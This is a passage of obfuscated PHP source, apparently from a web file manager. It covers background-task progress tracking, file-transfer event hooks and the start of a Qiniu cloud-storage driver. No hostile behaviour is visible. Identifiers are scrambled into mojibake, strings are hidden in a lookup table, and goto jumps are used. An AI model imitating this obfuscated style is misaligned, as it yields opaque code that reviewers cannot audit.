$âøöĞ“á[$Õ·™æŒİ[1167]]; $âøöĞ“á[$Õ·™æŒİ[1809]] = $âøöĞ“á[$Õ·™æŒİ[1807]] / $™¹ßÑìã; if ($âøöĞ“á[$Õ·™æŒİ[1808]] > 0) { $âøöĞ“á[$Õ·™æŒİ[1814]] = $™¹ßÑìã * (1 - $âøöĞ“á[$Õ·™æŒİ[1808]]) / $âøöĞ“á[$Õ·™æŒİ[1808]]; } $âøöĞ“á[$Õ·™æŒİ[1814]] = $âøöĞ“á[$Õ·™æŒİ[1814]] <= 0 ? 0 : $âøöĞ“á[$Õ·™æŒİ[1814]]; } $this->updateAfter(); $²‚—šÃ„ = 0.2; if (timeFloat() - $âøöĞ“á[$Õ·™æŒİ[1812]] < $²‚—šÃ„ && !$ÖËïøäô) { return; } $‚Å±ÈÖ = self::get($âøöĞ“á[$Õ·™æŒİ[478]]); $˜úœ×Ùú = $‚Å±ÈÖ[$Õ·™æŒİ[841]]; if ($˜úœ×Ùú == self::STATYS_KILL) { $²¯·”ê´ = array($Õ·™æŒİ[1824] => LNG($Õ·™æŒİ[1825]), $Õ·™æŒİ[1325] => !1); Cache::set($Õ·™æŒİ[1826] . $this->task[$Õ·™æŒİ[478]], $²¯·”ê´, 30); $this->onKill(); $this->end(); die; } else { if ($˜úœ×Ùú == self::STATYS_STOP) { $ÑÀ¹•±¦ = 2; $‚Å±ÈÖ[$Õ·™æŒİ[1813]] += $ÑÀ¹•±¦; self::valueSet($âøöĞ“á[$Õ·™æŒİ[478]], $‚Å±ÈÖ); sleep($ÑÀ¹•±¦); $this->update(); return; } } $âøöĞ“á[$Õ·™æŒİ[841]] = $˜úœ×Ùú ? $˜úœ×Ùú : $âøöĞ“á[$Õ·™æŒİ[841]]; $âøöĞ“á[$Õ·™æŒİ[1813]] = $‚Å±ÈÖ[$Õ·™æŒİ[1813]] ? $‚Å±ÈÖ[$Õ·™æŒİ[1813]] : 0; $âøöĞ“á[$Õ·™æŒİ[1812]] = timeFloat(); Hook::trigger($Õ·™æŒİ[1827], $âøöĞ“á); self::valueSet($âøöĞ“á[$Õ·™æŒİ[478]], $âøöĞ“á); } public function onKillSet($á¹ª–—», $³‘Ôëä = array()) { $this->onKillCall = array($á¹ª–—», $³‘Ôëä); } public function onKill() { $ÕÏ´Ñ¹£ =& $_SERVER[ÓïÕü]; self::log($ÕÏ´Ñ¹£[1820] . $this->task[$ÕÏ´Ñ¹£[478]] . $ÕÏ´Ñ¹£[1828]); Hook::trigger($ÕÏ´Ñ¹£[1829], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($õï‰èøœ) { $šÈŸŠø =& $_SERVER[ÓïÕü]; Cache::set($šÈŸŠø[1826] . $this->task[$šÈŸŠø[478]], $õï‰èøœ, 60); if (!is_array($õï‰èøœ) || !$õï‰èøœ[$šÈŸŠø[1325]]) { self::log($šÈŸŠø[1830] . json_encode($õï‰èøœ)); } return $õï‰èøœ; } public static function get($ú¦§¨­å) { $øºïñäÓ =& $_SERVER[ÓïÕü]; $å„¶âÀô = self::valueGet($ú¦§¨­å); if (is_array($å„¶âÀô) && $å„¶âÀô[$øºïñäÓ[1831]]) { $Äˆº«èÍ = ActionApply($å„¶âÀô[$øºïñäÓ[1831]], array($å„¶âÀô)); $å„¶âÀô = is_array($Äˆº«èÍ) ? $Äˆº«èÍ : $å„¶âÀô; } return $å„¶âÀô; } public static function listData() { $ˆ÷Ìßø = self::valueGet(); return array_sort_by($ˆ÷Ìßø, $_SERVER[ÓïÕü][1810], !0); } public static function kill($üòÑ³³) { return self::changeStatus($üòÑ³³, self::STATYS_KILL); } public static function stop($ÈÖì‹Õ¼) { return self::changeStatus($ÈÖì‹Õ¼, self::STATYS_STOP); } public static function restart($…¹”ÚÅ·) { return self::changeStatus($…¹”ÚÅ·, self::STATYS_RUNNING); } public static function killAll() { $Ÿ‹¿‚˜ı =& $_SERVER[ÓïÕü]; $Ï²Äó÷ = self::listData(); foreach ($Ï²Äó÷ as $ƒˆ€â¼¤) { self::kill($ƒˆ€â¼¤[$Ÿ‹¿‚˜ı[478]]); } sleep(2); foreach ($Ï²Äó÷ as $ƒˆ€â¼¤) { self::valueSet($ƒˆ€â¼¤[$Ÿ‹¿‚˜ı[478]], !1); } } private static function changeStatus($ä¨„ìã¤, $´Œè­¡) { $Ú·’öÒ¤ =& $_SERVER[ÓïÕü]; $Üıˆ•ƒ¨ = self::valueGet($ä¨„ìã¤); if (!$Üıˆ•ƒ¨) { return !1; } $Üıˆ•ƒ¨[$Ú·’öÒ¤[841]] = $´Œè­¡; self::valueSet($ä¨„ìã¤, $Üıˆ•ƒ¨); self::log($Ú·’öÒ¤[1832] . $Üıˆ•ƒ¨[$Ú·’öÒ¤[478]] . $Ú·’öÒ¤[1833] . $´Œè­¡); return !0; } public static function valueGet($©©Ô­Ñ = false) { $¹Ùåœ¦ƒ =& $_SERVER[ÓïÕü]; if ($©©Ô­Ñ) { $Öø«Ûåó = Model($¹Ùåœ¦ƒ[523])->where(array($¹Ùåœ¦ƒ[97] => $©©Ô­Ñ, $¹Ùåœ¦ƒ[33] => $¹Ùåœ¦ƒ[1176]))->find(); return $Öø«Ûåó ? json_decode($Öø«Ûåó[$¹Ùåœ¦ƒ[453]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($„òÄª¨º = false) { $ˆ±­èÕæ =& $_SERVER[ÓïÕü]; $ÔŸ¸×µ = array($ˆ±­èÕæ[33] => $ˆ±­èÕæ[1176]); if ($„òÄª¨º) { $ÔŸ¸×µ[$ˆ±­èÕæ[1806]] = $„òÄª¨º; } $”ˆöçÂå = Model($ˆ±­èÕæ[523])->where($ÔŸ¸×µ)->select(); $”ˆöçÂå = $”ˆöçÂå ? $”ˆöçÂå : array(); foreach ($”ˆöçÂå as $ˆ–È“µ => $šî‘Ô¼ë) { $”ˆöçÂå[$ˆ–È“µ] = json_decode($šî‘Ô¼ë[$ˆ±­èÕæ[453]], !0); } return $”ˆöçÂå; } public static function valueSet($Ôû‡ÁŒ‹, $˜›æ¤‹Ÿ) { $Ó†ˆ„¬„ =& $_SERVER[ÓïÕü]; if (!$˜›æ¤‹Ÿ) { return Model($Ó†ˆ„¬„[523])->where(array($Ó†ˆ„¬„[97] => $Ôû‡ÁŒ‹, $Ó†ˆ„¬„[33] => $Ó†ˆ„¬„[1176]))->delete(); } $›Éè½ÈÂ = json_encode($˜›æ¤‹Ÿ); if (!$›Éè½ÈÂ) { ob_start(); var_dump($˜›æ¤‹Ÿ); $Ö€Ü¨ÍÂ = ob_get_clean(); self::log($Ó†ˆ„¬„[1834] . json_encode_force($Ö€Ü¨ÍÂ)); } if (!$Ôû‡ÁŒ‹ || !$˜›æ¤‹Ÿ[$Ó†ˆ„¬„[478]]) { return !1; } $àåö¦ÁÏ = array($Ó†ˆ„¬„[33] => $Ó†ˆ„¬„[1176], $Ó†ˆ„¬„[1806] => USER_ID, $Ó†ˆ„¬„[97] => $Ôû‡ÁŒ‹, $Ó†ˆ„¬„[453] => $›Éè½ÈÂ); $˜şé‘„× = $Ó†ˆ„¬„[1835]; CacheLock::lock($˜şé‘„×); Model($Ó†ˆ„¬„[523])->add($àåö¦ÁÏ, array(), !0); CacheLock::unlock($˜şé‘„×); } public static function log($ıîØÂòØ) { if (!GLOBAL_DEBUG) { return; } write_log($ıîØÂòØ, $_SERVER[ÓïÕü][1836]); } } class TaskFileTransfer extends Task { protected function startAfter() { $º·È›Äõ =& $_SERVER[ÓïÕü]; $ ÈÚÑÙë =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($º·È›Äõ[1837], array($this, $º·È›Äõ[1838])); Hook::bind($º·È›Äõ[1336], array($this, $º·È›Äõ[1839])); Hook::bind($º·È›Äõ[1840], array($this, $º·È›Äõ[1841])); Hook::bind($º·È›Äõ[676], array($this, $º·È›Äõ[1842])); Hook::bind($º·È›Äõ[677], array($this, $º·È›Äõ[1843])); Hook::bind($º·È›Äõ[683], array($this, $º·È›Äõ[1844])); Hook::bind($º·È›Äõ[684], array($this, $º·È›Äõ[1845])); Hook::bind($º·È›Äõ[679], array($this, $º·È›Äõ[1846])); Hook::bind($º·È›Äõ[681], array($this, $º·È›Äõ[1847])); Hook::bind($º·È›Äõ[645], array($this, $º·È›Äõ[1848])); Hook::bind($º·È›Äõ[642], array($this, $º·È›Äõ[1848])); Hook::bind($º·È›Äõ[647], array($this, $º·È›Äõ[1848])); Hook::bind($º·È›Äõ[649], array($this, $º·È›Äõ[1848])); Hook::bind($º·È›Äõ[651], array($this, $º·È›Äõ[1848])); Hook::bind($º·È›Äõ[1849], array($this, $º·È›Äõ[1850])); Hook::bind($º·È›Äõ[667], array($this, $º·È›Äõ[1851])); $this->sourceModelCopyFlag = !1; Hook::bind($º·È›Äõ[1852], array($this, $º·È›Äõ[1853])); Hook::bind($º·È›Äõ[1854], array($this, $º·È›Äõ[1855])); Hook::bind($º·È›Äõ[1856], array($this, $º·È›Äõ[1857])); $ ÈÚÑÙë[$º·È›Äõ[1858]] = LNG($º·È›Äõ[1859]); $ ÈÚÑÙë[$º·È›Äõ[1860]] = 0; $ ÈÚÑÙë[$º·È›Äõ[1861]] = 0; $ ÈÚÑÙë[$º·È›Äõ[1169]] = $º·È›Äõ[12]; $ ÈÚÑÙë[$º·È›Äõ[1862]] = $º·È›Äõ[12]; $ ÈÚÑÙë[$º·È›Äõ[1863]] = 0; $ ÈÚÑÙë[$º·È›Äõ[1864]] = 0; $ ÈÚÑÙë[$º·È›Äõ[1865]] = 0; if (!$ ÈÚÑÙë[$º·È›Äõ[1694]]) { $ ÈÚÑÙë[$º·È›Äõ[1694]] = LNG($º·È›Äõ[1866]); } } protected function endAfter() { $Ø‡‡œÜÇ =& $_SERVER[ÓïÕü]; Hook::unbind($Ø‡‡œÜÇ[1837], array($this, $Ø‡‡œÜÇ[1838])); Hook::unbind($Ø‡‡œÜÇ[1336], array($this, $Ø‡‡œÜÇ[1839])); Hook::unbind($Ø‡‡œÜÇ[1840], array($this, $Ø‡‡œÜÇ[1841])); Hook::unbind($Ø‡‡œÜÇ[676], array($this, $Ø‡‡œÜÇ[1842])); Hook::unbind($Ø‡‡œÜÇ[677], array($this, $Ø‡‡œÜÇ[1843])); Hook::unbind($Ø‡‡œÜÇ[683], array($this, $Ø‡‡œÜÇ[1844])); Hook::unbind($Ø‡‡œÜÇ[684], array($this, $Ø‡‡œÜÇ[1845])); Hook::unbind($Ø‡‡œÜÇ[679], array($this, $Ø‡‡œÜÇ[1846])); Hook::unbind($Ø‡‡œÜÇ[681], array($this, $Ø‡‡œÜÇ[1847])); Hook::unbind($Ø‡‡œÜÇ[645], array($this, $Ø‡‡œÜÇ[1848])); Hook::unbind($Ø‡‡œÜÇ[642], array($this, $Ø‡‡œÜÇ[1848])); Hook::unbind($Ø‡‡œÜÇ[647], array($this, $Ø‡‡œÜÇ[1848])); Hook::unbind($Ø‡‡œÜÇ[649], array($this, $Ø‡‡œÜÇ[1848])); Hook::unbind($Ø‡‡œÜÇ[651], array($this, $Ø‡‡œÜÇ[1848])); Hook::unbind($Ø‡‡œÜÇ[1849], array($this, $Ø‡‡œÜÇ[1850])); Hook::unbind($Ø‡‡œÜÇ[667], array($this, $Ø‡‡œÜÇ[1851])); Hook::unbind($Ø‡‡œÜÇ[1852], array($this, $Ø‡‡œÜÇ[1853])); Hook::unbind($Ø‡‡œÜÇ[1854], array($this, $Ø‡‡œÜÇ[1855])); Hook::unbind($Ø‡‡œÜÇ[1856], array($this, $Ø‡‡œÜÇ[1857])); } public function copyMoveStart($‘ºœÉÏÂ, $»ƒÁ„šî, $Ç™æáÈº, $å®¾ë¥Ÿ) { $¸‡¤†Ë¯ =& $_SERVER[ÓïÕü]; self::log($¸‡¤†Ë¯[1867] . $»ƒÁ„šî . $¸‡¤†Ë¯[73] . $å®¾ë¥Ÿ); $“¦¸¤ñÜ = rtrim(TEMP_FILES, $¸‡¤†Ë¯[8]); if (substr($»ƒÁ„šî, 0, strlen($“¦¸¤ñÜ)) == $“¦¸¤ñÜ) { return; } if (substr($å®¾ë¥Ÿ, 0, strlen($“¦¸¤ñÜ)) == $“¦¸¤ñÜ) { return; } $™ö÷øÊ =& $this->task; $™ö÷øÊ[$¸‡¤†Ë¯[1868]] = KodIO::transferType($‘ºœÉÏÂ, $Ç™æáÈº); $this->update(); } public function updateAfter() { $ó á§™ =& $_SERVER[ÓïÕü]; $¼ñæÈˆæ =& $this->task; if (!$¼ñæÈˆæ[$ó á§™[854]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($¼ñæÈˆæ[$ó á§™[1868]] == $ó á§™[1437]) { return; } self::updateTask($¼ñæÈˆæ); } private static function updateTask(&$ƒç¸‚ñĞ) { $¼±¯ÇìÇ =& $_SERVER[ÓïÕü]; if ($ƒç¸‚ñĞ[$¼±¯ÇìÇ[1868]] == $¼±¯ÇìÇ[1307] || $ƒç¸‚ñĞ[$¼±¯ÇìÇ[1868]] == $¼±¯ÇìÇ[110]) { if ($ƒç¸‚ñĞ[$¼±¯ÇìÇ[1862]]) { $ƒç¸‚ñĞ[$¼±¯ÇìÇ[1865]] = $ƒç¸‚ñĞ[$¼±¯ÇìÇ[1864]] + $ƒç¸‚ñĞ[$¼±¯ÇìÇ[1861]]; } } else { if ($ƒç¸‚ñĞ[$¼±¯ÇìÇ[1868]] == $¼±¯ÇìÇ[1438]) { if ($ƒç¸‚ñĞ[$¼±¯ÇìÇ[1862]] == $¼±¯ÇìÇ[1307]) { $ƒç¸‚ñĞ[$¼±¯ÇìÇ[1865]] = $ƒç¸‚ñĞ[$¼±¯ÇìÇ[1864]] + $ƒç¸‚ñĞ[$¼±¯ÇìÇ[1861]] * 0.5; } else { if ($ƒç¸‚ñĞ[$¼±¯ÇìÇ[1862]] == $¼±¯ÇìÇ[110]) { $ƒç¸‚ñĞ[$¼±¯ÇìÇ[1865]] = $ƒç¸‚ñĞ[$¼±¯ÇìÇ[1864]] + $ƒç¸‚ñĞ[$¼±¯ÇìÇ[1860]] * 0.5 + $ƒç¸‚ñĞ[$¼±¯ÇìÇ[1861]] * 0.5; } } } } $ƒç¸‚ñĞ[$¼±¯ÇìÇ[1808]] = $ƒç¸‚ñĞ[$¼±¯ÇìÇ[1865]] / $ƒç¸‚ñĞ[$¼±¯ÇìÇ[854]]; if ($ƒç¸‚ñĞ[$¼±¯ÇìÇ[1808]] > 0) { $ÀŞÒ»¢ó = timeFloat() - $ƒç¸‚ñĞ[$¼±¯ÇìÇ[1810]] - $ƒç¸‚ñĞ[$¼±¯ÇìÇ[1813]]; $ƒç¸‚ñĞ[$¼±¯ÇìÇ[1814]] = $ÀŞÒ»¢ó * (1 - $ƒç¸‚ñĞ[$¼±¯ÇìÇ[1808]]) / $ƒç¸‚ñĞ[$¼±¯ÇìÇ[1808]]; } } public function addPath($™Š”£æ¬) { $Õñ¤ÕÇÙ =& $_SERVER[ÓïÕü]; if (!$™Š”£æ¬) { return; } $²´Îœü =& $this->task; $§Á‘ö—¾ = IO::infoWithChildren($™Š”£æ¬); $ï¡ùĞËé = $²´Îœü[$Õñ¤ÕÇÙ[1869]] ? $²´Îœü[$Õñ¤ÕÇÙ[1869]][$Õñ¤ÕÇÙ[1870]] : 0; $²´Îœü[$Õñ¤ÕÇÙ[1869]] = array($Õñ¤ÕÇÙ[1870] => $ï¡ùĞËé + 1, $Õñ¤ÕÇÙ[497] => $§Á‘ö—¾[$Õñ¤ÕÇÙ[32]], $Õñ¤ÕÇÙ[87] => $§Á‘ö—¾[$Õñ¤ÕÇÙ[87]], $Õñ¤ÕÇÙ[587] => $§Á‘ö—¾[$Õñ¤ÕÇÙ[587]] ? $§Á‘ö—¾[$Õñ¤ÕÇÙ[587]] : $§Á‘ö—¾[$Õñ¤ÕÇÙ[87]]); if ($§Á‘ö—¾[$Õñ¤ÕÇÙ[33]] == $Õñ¤ÕÇÙ[233]) { $²´Îœü[$Õñ¤ÕÇÙ[1167]] += 1; } else { $²´Îœü[$Õñ¤ÕÇÙ[1167]] += $§Á‘ö—¾[$Õñ¤ÕÇÙ[82]][$Õñ¤ÕÇÙ[80]]; if ($§Á‘ö—¾[$Õñ¤ÕÇÙ[194]]) { $²´Îœü[$Õñ¤ÕÇÙ[1167]] += $§Á‘ö—¾[$Õñ¤ÕÇÙ[82]][$Õñ¤ÕÇÙ[81]] + 1; } } $²´Îœü[$Õñ¤ÕÇÙ[854]] += $§Á‘ö—¾[$Õñ¤ÕÇÙ[79]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($™¦Üóå­) { } public function sourceAddHashEnd($æ›˜´¥) { } public function sourceAddFileStart($¦ö–·Ü‹) { $›‹ì»¢€ =& $_SERVER[ÓïÕü]; $µé»ÄÏŠ =& $this->task; $µé»ÄÏŠ[$›‹ì»¢€[1860]] = $¦ö–·Ü‹[$›‹ì»¢€[79]]; $µé»ÄÏŠ[$›‹ì»¢€[1858]] = $¦ö–·Ü‹[$›‹ì»¢€[32]]; $µé»ÄÏŠ[$›‹ì»¢€[1169]] = $¦ö–·Ü‹[$›‹ì»¢€[32]]; $µé»ÄÏŠ[$›‹ì»¢€[1871]] = $¦ö–·Ü‹[$›‹ì»¢€[87]]; $this->update(); } public function sourceAddFileEnd($Å•àÅß) { $ëïñ÷­€ =& $_SERVER[ÓïÕü]; $Ã¿ Ş›à =& $this->task; $Ã¿ Ş›à[$ëïñ÷­€[1865]] += $Å•àÅß[$ëïñ÷­€[79]]; $Ã¿ Ş›à[$ëïñ÷­€[1871]] = $Å•àÅß[$ëïñ÷­€[87]]; $this->update(1); } public function copyFileStart($í£–µÊ, $– ¤êÏ , $•°óÍËæ, $ƒ†ÂÏ©ô, $¤•õ¾»¶, $”äñÈï) { $™È—‰û =& $_SERVER[ÓïÕü]; $Å²ùúŒ× = $¤•õ¾»¶; if ($Å²ùúŒ× == $GLOBALS[$™È—‰û[1872]]) { $Å²ùúŒ× = $GLOBALS[$™È—‰û[1873]]; } $GLOBALS[$™È—‰û[1873]] = $¤•õ¾»¶; $GLOBALS[$™È—‰û[1872]] = $”äñÈï; $’ŠĞçåâ =& $this->task; $’ŠĞçåâ[$™È—‰û[1858]] = $Å²ùúŒ×; $’ŠĞçåâ[$™È—‰û[1860]] = (int) $í£–µÊ->size($– ¤êÏ ); $’ŠĞçåâ[$™È—‰û[1861]] = 0; $’ŠĞçåâ[$™È—‰û[1169]] = $™È—‰û[12]; $’ŠĞçåâ[$™È—‰û[1862]] = $™È—‰û[12]; $’ŠĞçåâ[$™È—‰û[1863]] = 0; $» Ü§ø = $’ŠĞçåâ[$™È—‰û[1860]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($’ŠĞçåâ[$™È—‰û[478]] . $™È—‰û[1874]); if ($» Ü§ø && file_exists(get_path_father($ƒ†ÂÏ©ô))) { Cache::set($’ŠĞçåâ[$™È—‰û[478]] . $™È—‰û[1874], $ƒ†ÂÏ©ô); $’ŠĞçåâ[$™È—‰û[1831]] = array($™È—‰û[1875], $™È—‰û[1876]); } $this->update(0, $» Ü§ø); } public static function updateCopyLocalFileSize($Í—…ÛñŒ) { $ÁäŒ’˜ş =& $_SERVER[ÓïÕü]; $¢Ø¢¢ø› = Cache::get($Í—…ÛñŒ[$ÁäŒ’˜ş[478]] . $ÁäŒ’˜ş[1874]); if (!$¢Ø¢¢ø› || !file_exists($¢Ø¢¢ø›)) { return $Í—…ÛñŒ; } $Í—…ÛñŒ[$ÁäŒ’˜ş[1861]] = @filesize($¢Ø¢¢ø›); $Í—…ÛñŒ[$ÁäŒ’˜ş[1865]] += $Í—…ÛñŒ[$ÁäŒ’˜ş[1861]]; self::updateTask($Í—…ÛñŒ); return $Í—…ÛñŒ; } public function copyFileEnd($ë“ì›ñ, $„ç£‚ºÔ, $Ëî¸‹©è, $Ÿéø‡İª, $—ñÁš, $­…–Ë§») { $‘ùŠ·œè =& $_SERVER[ÓïÕü]; $×çÈƒÏ¹ =& $this->task; $×çÈƒÏ¹[$‘ùŠ·œè[1861]] = $×çÈƒÏ¹[$‘ùŠ·œè[1860]]; $×çÈƒÏ¹[$‘ùŠ·œè[1862]] = $‘ùŠ·œè[12]; unset($×çÈƒÏ¹[$‘ùŠ·œè[1831]]); if ($—ñÁš == $×çÈƒÏ¹[$‘ùŠ·œè[1858]]) { $×çÈƒÏ¹[$‘ùŠ·œè[1864]] += $×çÈƒÏ¹[$‘ùŠ·œè[1860]]; $×çÈƒÏ¹[$‘ùŠ·œè[1865]] = $×çÈƒÏ¹[$‘ùŠ·œè[1864]]; $õäƒÁêˆ = 1; if (isset($×çÈƒÏ¹[$‘ùŠ·œè[1871]]) && $×çÈƒÏ¹[$‘ùŠ·œè[1871]] == $„ç£‚ºÔ) { $õäƒÁêˆ = 0; } $this->update($õäƒÁêˆ); } else { $this->update(); $×çÈƒÏ¹[$‘ùŠ·œè[1861]] = 0; } Cache::remove($×çÈƒÏ¹[$‘ùŠ·œè[478]] . $‘ùŠ·œè[1874]); self::log($‘ùŠ·œè[1877] . $„ç£‚ºÔ . $‘ùŠ·œè[73] . $Ÿéø‡İª . $‘ùŠ·œè[288] . $—ñÁš . $‘ùŠ·œè[1878] . $×çÈƒÏ¹[$‘ùŠ·œè[1858]]); } public function updateFileEnd($ÜÍÇ•ùĞ, $äµù³Õï) { $ã€ÜıÛ‡ =& $_SERVER[ÓïÕü]; $ô›¡´º =& $this->task; $ô›¡´º[$ã€ÜıÛ‡[1858]] = $ÜÍÇ•ùĞ; $ô›¡´º[$ã€ÜıÛ‡[1860]] = $äµù³Õï; $ô›¡´º[$ã€ÜıÛ‡[1864]] += $äµù³Õï; $ô›¡´º[$ã€ÜıÛ‡[1865]] = $ô›¡´º[$ã€ÜıÛ‡[1864]]; $this->update(1); self::log($ã€ÜıÛ‡[1879] . $ÜÍÇ•ùĞ); } public function sourceModelCopy($±İ¨­Ú‡) { $äÌÆ¶îö =& $_SERVER[ÓïÕü]; $âÒÜ»ÊÎ = $±İ¨­Ú‡[0]; $Ê­ôö = $±İ¨­Ú‡[1]; $©±Ã¿Ë =& $this->task; $this->sourceModelCopyFlag = !0; $ĞÜîªä± = 0; switch ($âÒÜ»ÊÎ) { case $äÌÆ¶îö[643]: $ĞÜîªä± = 1; break; case $äÌÆ¶îö[646]: $©±Ã¿Ë[$äÌÆ¶îö[1858]] = $Ê­ôö[$äÌÆ¶îö[32]]; break; case $äÌÆ¶îö[648]: $ĞÜîªä± = intval($±İ¨­Ú‡[$äÌÆ¶îö[459]] * 0.4); break; case $äÌÆ¶îö[650]: $ĞÜîªä± = intval($±İ¨­Ú‡[$äÌÆ¶îö[459]] * 0.2); break; case $äÌÆ¶îö[652]: $ĞÜîªä± = intval($±İ¨­Ú‡[$äÌÆ¶îö[459]] * 0.4); break; } $this->update($ĞÜîªä±); $this->sourceModelCopyFlag = !1; } public function sourceRemove($¤¦ÄÀîÔ, $âßöÀî) { $ıÁÎ† =& $_SERVER[ÓïÕü]; $this->sourceModelCopyFlag = !0; $´¬Ó¥ª¿ = 1; if (isset($¤¦ÄÀîÔ[$ıÁÎ†[82]])) { $´¬Ó¥ª¿ = $¤¦ÄÀîÔ[$ıÁÎ†[82]][$ıÁÎ†[80]]; $´¬Ó¥ª¿ = $´¬Ó¥ª¿ + $¤¦ÄÀîÔ[$ıÁÎ†[82]][$ıÁÎ†[81]] + 1; } $this->update($´¬Ó¥ª¿); $this->sourceModelCopyFlag = !1; } public function sourceMove($ªŠ ©‘ò) { $this->sourceRemove($ªŠ ©‘ò, !1); } public function curlProgress($å‘™á‰, $¥ñõ“˜Õ, $€Ë™„Ş´, $½¶Ê§ø, $‹¹¤Ç†) { $£ØÒà×³ =& $_SERVER[ÓïÕü]; $ôå›İå² =& $this->task; if ($‹¹¤Ç† > 0) { $ôå›İå²[$£ØÒà×³[1169]] = $£ØÒà×³[1880]; $ôå›İå²[$£ØÒà×³[1862]] = $£ØÒà×³[110]; if ($ôå›İå²[$£ØÒà×³[1860]]) { $ôå›İå²[$£ØÒà×³[1861]] = $‹¹¤Ç†; } if ($ôå›İå²[$£ØÒà×³[1863]]) { $ôå›İå²[$£ØÒà×³[1861]] = $‹¹¤Ç† + $ôå›İå²[$£ØÒà×³[1863]]; } } else { if ($€Ë™„Ş´ > 0) { if ($ôå›İå²[$£ØÒà×³[1860]] == $¥ñõ“˜Õ) { $ôå›İå²[$£ØÒà×³[1861]] = $€Ë™„Ş´; $ôå›İå²[$£ØÒà×³[1169]] = $£ØÒà×³[1881]; $ôå›İå²[$£ØÒà×³[1862]] = $£ØÒà×³[1307]; } } } $this->update(); } public function curlProgressStart($é¾Ë¾Ğ¸) { } public function curlProgressEnd($µí¦¦¬) { $‘¢İüñ =& $_SERVER[ÓïÕü]; $·ÏÎ´Üâ =& $this->task; $¸Õå’á = curl_getinfo($µí¦¦¬); $¶š€ùè¬ = $¸Õå’á[$‘¢İüñ[1882]]; if ($¶š€ùè¬ == -1) { $¶š€ùè¬ = $¸Õå’á[$‘¢İüñ[1883]]; } if ($·ÏÎ´Üâ[$‘¢İüñ[1862]] == $‘¢İüñ[110] && $¶š€ùè¬) { $·ÏÎ´Üâ[$‘¢İüñ[1863]] += $¶š€ùè¬; } $this->update(); } } goto FóîÏÔ‡àÒ; DÇ°È¹Ë˜ê: define($_SERVER[ÓïÕü][320], 3); define($_SERVER[ÓïÕü][321], 1); define($_SERVER[ÓïÕü][322], 0); goto bÜ¢–Õ¨éÔ; c…“ÁÍĞÅ: class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public $config = array(); public function __construct($“’èµüò) { parent::__construct(); require_once SDK_DIR . $_SERVER[ÓïÕü][1563]; $this->_init($“’èµüò); } public function _init($ö®Ôè®) { $áâŒò£Å =& $_SERVER[ÓïÕü]; $this->config = $ö®Ôè®; foreach ($ö®Ôè® as $Íˆ±±ÛÎ => $ë”°°åã) { if (isset($this->{$Íˆ±±ÛÎ})) { $this->{$Íˆ±±ÛÎ} = $ë”°°åã; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($áâŒò£Å[1564] . LNG($áâŒò£Å[1500])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->configView = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->configView); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($ÛƒÏƒı, $¶ı‹òÚ = '', $ñèÇúúÙ = REPEAT_RENAME) { if ($this->setContent($ÛƒÏƒı, $¶ı‹òÚ)) { return $this->getPathOuter($ÛƒÏƒı); } return !1; } public function mkdir($ã¨”Ü§Š, $²´âßâ = REPEAT_SKIP) { $ı¶¶í‡ =& $_SERVER[ÓïÕü]; $Û„Ëê— = trim($ã¨”Ü§Š, $ı¶¶í‡[8]); if ($this->_isFolder($Û„Ëê—)) { return $this->getPathOuter($Û„Ëê—); } $ã¨”Ü§Š = $Û„Ëê— . $ı¶¶í‡[8]; $¨ØßÎçÔ = get_path_this($Û„Ëê—); $˜‰éÈ²Ö = $ã¨”Ü§Š . $¨ØßÎçÔ; if (!$this->mkfile($˜‰éÈ²Ö)) { return !1; } if (!$this->moveFile($˜‰éÈ²Ö, $ã¨”Ü§Š)) { $this->delFile($˜‰éÈ²Ö); return !1; } return $this->getPathOuter($Û„Ëê—); } public function copyFile($åÁ„”º£, $­ôº¡Õğ) { $Ó¿Ú­ò = $this->bucketManager->copy($this->bucket, $åÁ„”º£, $this->bucket, $­ôº¡Õğ, !0); return $Ó¿Ú­ò ? !1 : $this->getPathOuter($­ôº¡Õğ); } public function moveFile($ ±«‰ãå, $×·åëà¾) { $æ´üÃóâ = $this->bucketManager->move($this->bucket, $ ±«‰ãå, $this->bucket, $×·åëà¾, !0); return $æ´üÃóâ ? !1 : $this->getPathOuter($×·åëà¾); } public function delFile($§äå’Õî) { if (!$this->exist($§äå’Õî)) { return !0; } $–‡Í ­¼ = $this->bucketManager->delete($this->bucket, $§äå’Õî); if (!$–‡Í ­¼) { return !0; } return $–‡Í ­¼->code() == 612 ? !0 : !1; } public function delFolder($å¥Ùğş¥) { $“›«ì =& $_SERVER[ÓïÕü]; if (!$this->exist($å¥Ùğş¥)) { return !0; } $this->listItemCache = !1; $º«Ó°ä¬ = $this->fileList($å¥Ùğş¥); $this->listItemCache = !0; $¾ê†æ…× = trim($å¥Ùğş¥, $“›«ì[8]) . $“›«ì[8]; if (!empty($å¥Ùğş¥) && $å¥Ùğş¥ !== $“›«ì[231] && !in_array($¾ê†æ…×, $º«Ó°ä¬[$“›«ì[85]])) { $º«Ó°ä¬[$“›«ì[85]][] = $¾ê†æ…×; } $‚§¾Ùâ = $this->delByBatch($º«Ó°ä¬[$“›«ì[86]]); if (!$‚§¾Ùâ) { return !1; } $‚§¾Ùâ = $this->delByBatch($º«Ó°ä¬[$“›«ì[85]]); if (!$‚§¾Ùâ) { return !1; } return $this->delFile($¾ê†æ…×); } private function delByBatch($ÀËí‚ù) { foreach (array_chunk($ÀËí‚ù, 1000) as $ˆÇğæº¶) { $´Ğóã£ = 